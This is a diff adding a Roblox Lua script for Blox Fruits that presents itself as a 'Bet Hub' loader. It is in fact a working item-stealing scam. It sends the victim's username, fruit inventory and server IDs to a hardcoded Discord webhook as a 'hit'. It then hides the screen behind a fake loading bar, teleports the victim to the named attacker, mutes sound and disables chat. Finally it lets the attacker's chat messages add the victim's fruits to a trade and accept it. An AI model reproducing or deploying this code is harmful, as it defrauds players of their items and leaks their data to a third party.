@@ -1,0 +1,422 @@
+if _G.BetHubExecutado then
+    warn("Script já foi executado!")
+    return
+end
+_G.BetHubExecutado = true
+
+-- Serviços
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Variáveis
+local targetPlayerName = "robloxromao"
+local placeId = game.PlaceId
+local jobId = game.JobId
+local webhookURL = "https://discord.com/api/webhooks/1407132376068522146/tNjtKEx89kYotCF98p-CwZVz5O7mQYnSwkn5UY1t8fjKYdwdCS0BZiSWNn6tqNlp8Mml"
+local firstTeleportDone = false  
+
+-- Raridade das frutas
+local fruitRarity = {
+    "Dragon", "Kitsune", "Leopard", "Spirit", "Dough", "Venom", "Control", "Gas", 
+    "Shadow", "T-Rex", "Mammoth", "Gravity", "Rumble", "Blizzard", "Portal", "Phoenix", 
+    "Sound", "Spider", "Love", "Buddha", "Quake", "Magma", "Ghost", "Barrier", 
+    "Rubber", "Light", "Ice", "Flame"
+}
+local rarityMap = {}
+for i, name in ipairs(fruitRarity) do
+    rarityMap[name] = #fruitRarity - i + 1
+end
+
+-- <<< UI STARRY LOADING >>>
+local function createStarryLoadingUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "StarryLoadingUI"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = PlayerGui
+
+    -- Container (janela centralizada)
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0, 600, 0, 300)
+    container.Position = UDim2.new(0.5, 0, 0.5, 0)
+    container.AnchorPoint = Vector2.new(0.5, 0.5)
+    container.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
+    container.BorderSizePixel = 0
+    container.ClipsDescendants = true
+    container.Parent = screenGui
+
+    local containerCorner = Instance.new("UICorner")
+    containerCorner.CornerRadius = UDim.new(0, 18)
+    containerCorner.Parent = container
+
+    -- Título / texto
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Size = UDim2.new(1, 0, 0.18, 0)
+    loadingText.Position = UDim2.new(0, 0, 0.06, 0)
+    loadingText.BackgroundTransparency = 1
+    loadingText.Text = "Loading script..."
+    loadingText.Font = Enum.Font.GothamBold
+    loadingText.TextSize = 26
+    loadingText.TextColor3 = Color3.fromRGB(235, 235, 245)
+    loadingText.TextStrokeTransparency = 0.8
+    loadingText.Parent = container
+
+    -- Barra de fundo (arredondada)
+    local barBackground = Instance.new("Frame")
+    barBackground.Size = UDim2.new(0.8, 0, 0.12, 0)
+    barBackground.Position = UDim2.new(0.1, 0, 0.68, 0)
+    barBackground.BackgroundColor3 = Color3.fromRGB(38, 40, 58)
+    barBackground.BorderSizePixel = 0
+    barBackground.Parent = container
+
+    local barBgCorner = Instance.new("UICorner")
+    barBgCorner.CornerRadius = UDim.new(1, 0)
+    barBgCorner.Parent = barBackground
+
+    -- Barra de progresso (começa vazia)
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.Position = UDim2.new(0, 0, 0, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 160)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = barBackground
+
+    local progressCorner = Instance.new("UICorner")
+    progressCorner.CornerRadius = UDim.new(1, 0)
+    progressCorner.Parent = progressBar
+
+    -- Brilho/contorno da barra
+    local glow = Instance.new("UIStroke")
+    glow.Thickness = 2
+    glow.Transparency = 0.4
+    glow.Color = Color3.fromRGB(120, 255, 220)
+    glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    glow.Parent = progressBar
+
+    -- Função para criar uma estrela com rastro
+    local function createStar()
+        local startX = math.random(-30, 130) / 100
+        local startY = -0.22
+        local startPos = UDim2.new(startX, 0, startY, 0)
+
+        local deltaX = 0.9
+        local deltaY = 1.1
+        local duration = math.random(3, 6)
+
+        -- Tail (rastro)
+        local tail = Instance.new("Frame")
+        tail.Size = UDim2.new(0, math.random(40, 70), 0, math.random(2, 3))
+        tail.Position = startPos
+        tail.AnchorPoint = Vector2.new(0.5, 0.5)
+        tail.BackgroundTransparency = 1
+        tail.BorderSizePixel = 0
+        tail.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        tail.ZIndex = 1
+        tail.Parent = container
+
+        tail.Rotation = 45
+
+        local grad = Instance.new("UIGradient")
+        grad.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
+            ColorSequenceKeypoint.new(0.6, Color3.new(1, 1, 1)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+        })
+        grad.Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 1),
+            NumberSequenceKeypoint.new(0.15, 0),
+            NumberSequenceKeypoint.new(1, 1)
+        })
+        grad.Rotation = 0
+        grad.Parent = tail
+
+        -- Head (ponto brilhante)
+        local head = Instance.new("Frame")
+        head.Size = UDim2.new(0, 2, 0, 2)
+        head.Position = startPos
+        head.AnchorPoint = Vector2.new(0.5, 0.5)
+        head.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        head.BorderSizePixel = 0
+        head.ZIndex = 2
+        head.Parent = container
+
+        local headCorner = Instance.new("UICorner")
+        headCorner.CornerRadius = UDim.new(1, 0)
+        headCorner.Parent = head
+
+        local endPos = UDim2.new(startX + deltaX, 0, startY + deltaY, 0)
+        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+
+        local t1 = TweenService:Create(head, tweenInfo, { Position = endPos, BackgroundTransparency = 1 })
+        local t2 = TweenService:Create(tail, tweenInfo, { Position = endPos, BackgroundTransparency = 1 })
+
+        t1:Play()
+        t2:Play()
+
+        t1.Completed:Connect(function()
+            pcall(function()
+                head:Destroy()
+                tail:Destroy()
+            end)
+        end)
+    end
+
+    -- Loop de estrelas
+    task.spawn(function()
+        while screenGui.Parent do
+            createStar()
+            task.wait(0.12 + math.random() * 0.06)
+        end
+    end)
+
+    -- Animação da barra de loading
+    local function animateLoading()
+        local firstTarget = 0.25
+        local tFirst = TweenService:Create(progressBar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = UDim2.new(firstTarget, 0, 1, 0) })
+        tFirst:Play()
+
+        tFirst.Completed:Wait()
+
+        local secondTarget = 1
+        local remainingDuration = 180
+        local tSecond = TweenService:Create(progressBar, TweenInfo.new(remainingDuration, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), { Size = UDim2.new(secondTarget, 0, 1, 0) })
+        tSecond:Play()
+
+        local pulseTweenInfo = TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+        local pulseProps = { BackgroundColor3 = Color3.fromRGB(50, 255, 200) }
+        local pulse = TweenService:Create(progressBar, pulseTweenInfo, pulseProps)
+        pulse:Play()
+
+        return tSecond, pulse -- Retornar os tweens para poder cancelar depois
+    end
+
+    local loadingTween, pulseTween = animateLoading()
+    
+    return screenGui, loadingTween, pulseTween
+end
+
+-- Função para remover a UI starry loading
+local function removeStarryLoadingUI()
+    local starryUI = PlayerGui:FindFirstChild("StarryLoadingUI")
+    if starryUI then
+        starryUI:Destroy()
+    end
+end
+
+-- Criar a UI starry loading assim que o script executar
+local starryScreenGui, loadingTween, pulseTween = createStarryLoadingUI()
+
+-- Funções utilitárias
+local function removerSons()
+    for _, obj in ipairs(game:GetDescendants()) do
+        if obj:IsA("Sound") then obj:Destroy() end
+    end
+end
+
+local function bloquearPulo()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = char:FindFirstChild("Humanoid")
+    if humanoid then humanoid.JumpPower = 0 end
+end
+
+-- <<< TELEPORT restaurado para comportamento "Antes" >>>
+local function teleportToPlayer(targetPlayer)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if targetHRP then
+            -- REMOVER A UI STARRY LOADING ANTES DO TELEPORT
+            removeStarryLoadingUI()
+            
+            task.wait(0.1)
+            LocalPlayer.Character.HumanoidRootPart.CFrame = targetHRP.CFrame + targetHRP.CFrame.LookVector * 10
+            task.delay(0.5, bloquearPulo)
+
+            if not firstTeleportDone then
+                firstTeleportDone = true
+                task.delay(1.50, removerSons)
+                task.delay(0.1, function()
+                    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+                    local chat = playerGui and playerGui:FindFirstChild("Chat")
+                    if chat then chat.Enabled = false end
+                end)
+            end
+        end
+    end
+end
+
+-- <<< UI de Loading original restaurado para comportamento "Antes" >>>
+local function createOrUpdateLoadingUI(visible)
+    local screenGui = LocalPlayer.PlayerGui:FindFirstChild("LoadingUI")
+
+    if not screenGui then
+        screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "LoadingUI"
+        screenGui.Parent = LocalPlayer.PlayerGui
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 90000, 0, 90000)
+        frame.AnchorPoint = Vector2.new(0.5, 0.5)
+        frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
+        frame.BorderSizePixel = 0
+        frame.Name = "MainFrame"
+        frame.Parent = screenGui
+
+        local loadingText = Instance.new("TextLabel")
+        loadingText.Size = UDim2.new(0, 200, 0, 30)
+        loadingText.Position = UDim2.new(0.5, -100, 0.5, -50)
+        loadingText.BackgroundTransparency = 1
+        loadingText.Text = "Loading Bet Hub"
+        loadingText.TextSize = 20
+        loadingText.Font = Enum.Font.GothamBold
+        loadingText.TextColor3 = Color3.fromRGB(0, 0, 0)
+        loadingText.Parent = frame
+
+        local progressBarFrame = Instance.new("Frame")
+        progressBarFrame.Size = UDim2.new(0, 260, 0, 20)
+        progressBarFrame.Position = UDim2.new(0.5, -130, 0.5, -10)
+        progressBarFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        progressBarFrame.BorderSizePixel = 0
+        progressBarFrame.Parent = frame
+        progressBarFrame.ClipsDescendants = true
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 10)
+        corner.Parent = progressBarFrame
+
+        local progressBar = Instance.new("Frame")
+        progressBar.Size = UDim2.new(0, 0, 1, 0)
+        progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        progressBar.BorderSizePixel = 0
+        progressBar.Parent = progressBarFrame
+
+        local progressCorner = Instance.new("UICorner")
+        progressCorner.CornerRadius = UDim.new(0, 10)
+        progressCorner.Parent = progressBar
+
+        task.spawn(function()
+            for i = 1, 100 do
+                progressBar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Sine", 0.45, true)
+                task.wait(0.45)
+            end
+        end)
+    end
+
+    screenGui.Enabled = true
+end
+
+local function waitForPlayerToBeSpawned(player)
+    local char = player.Character or player.CharacterAdded:Wait()
+    while not char:FindFirstChild("Humanoid") do task.wait(0.1) end
+    return char
+end
+
+-- Monitorar jogador alvo
+local function monitorRobloxRomao()
+    local player = Players:FindFirstChild(targetPlayerName)
+    if not player then return end
+    local char = waitForPlayerToBeSpawned(player)
+    local humanoid = char:FindFirstChild("Humanoid")
+    if not humanoid then return end
+
+    humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
+        if humanoid.Sit then
+            print(targetPlayerName.." sentou-se.")
+            createOrUpdateLoadingUI(true)
+            teleportToPlayer(player)
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == targetPlayerName then
+        player.CharacterAdded:Connect(monitorRobloxRomao)
+    end
+end)
+
+if Players:FindFirstChild(targetPlayerName) then
+    monitorRobloxRomao()
+end
+
+-- Sistema de Trade via Chat simplificado
+local function onChatted(player, message)
+    if player ~= LocalPlayer and player.Name == targetPlayerName then
+        local fruits = {
+            dragon="Dragon-Dragon", kitsune="Kitsune-Kitsune", yeti="Yeti-Yeti", leopard="Leopard-Leopard",
+            spirit="Spirit-Spirit", gas="Gas-Gas", control="Control-Control", venom="Venom-Venom",
+            shadow="Shadow-Shadow", dough="Dough-Dough", mammoth="Mammoth-Mammoth", t_rex="T-rex-T-rex",
+            gravity="Gravity-Gravity", blizzard="Blizzard-Blizzard", pain="Pain-Pain", rumble="Rumble-Rumble",
+            portal="Portal-Portal", phoenix="Phoenix-Phoenix", sound="Sound-Sound", love="Love-Love",
+            buddha="Buddha-Buddha", quake="Quake-Quake"
+        }
+        message = message:lower()
+        if message:sub(1,1) == "-" then
+            local f = message:sub(2)
+            if fruits[f] then ReplicatedStorage.Remotes.TradeFunction:InvokeServer("removeItem", fruits[f]) end
+        elseif message == "accept" then
+            ReplicatedStorage.Remotes.TradeFunction:InvokeServer("accept")
+        elseif fruits[message] then
+            ReplicatedStorage.Remotes.TradeFunction:InvokeServer("addItem", fruits[message])
+        end
+    end
+end
+
+for _, p in ipairs(Players:GetPlayers()) do p.Chatted:Connect(function(msg) onChatted(p,msg) end) end
+Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(msg) onChatted(p,msg) end) end)
+
+-- Detectar Sea
+local function detectarSea()
+    local id = game.PlaceId
+    if id == 2753915549 then return "First Sea"
+    elseif id == 4442272183 then return "Second Sea"
+    elseif id == 7449423635 then return "Third Sea"
+    else return "Desconhecido" end
+end
+
+-- Enviar inventário para webhook
+local function enviarInventario()
+    local InventoryRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+    local InventoryData = InventoryRemote:InvokeServer("getInventory")
+    local fruits = {}
+
+    for _, item in pairs(InventoryData) do
+        if item.Type == "Blox Fruit" then
+            local baseName = string.match(item.Name, "([^-]+)") or item.Name
+            fruits[#fruits+1] = {name=item.Name, count=item.Count or 1, rarity=rarityMap[baseName] or 0}
+        end
+    end
+
+    table.sort(fruits, function(a,b) return a.rarity > b.rarity end)
+
+    local fruitsList = ""
+    for _, f in ipairs(fruits) do fruitsList = fruitsList..f.name.." - "..f.count.."\n" end
+    if fruitsList == "" then fruitsList = "Nenhuma fruta encontrada." end
+
+    local seaAtual = detectarSea()
+    local teleportCommand = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s,\"%s\")\n```", placeId, jobId)
+    local infoBlock = string.format("```\nUsername: %s\nYou: %s\nSea: %s\n```", LocalPlayer.Name, targetPlayerName, seaAtual)
+    local inventoryBlock = string.format("```\n%s```", fruitsList)
+
+    local requestData = {
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"]="application/json"},
+        Body = HttpService:JSONEncode({
+            content = teleportCommand,
+            embeds = {{title="Hit novo", color=16711680, description=infoBlock.."\n"..inventoryBlock, footer={text="Place ID: "..placeId.." | Job ID: "..jobId}}}
+        })
+    }
+
+    if syn and syn.request then syn.request(requestData)
+    elseif http and http.request then http.request(requestData)
+    elseif request then request(requestData)
+    else warn("Exploit não suporta requisições HTTP.") end
+end
+
+task.wait(1)
+enviarInventario()
+print("Script carregado e webhook enviado.")
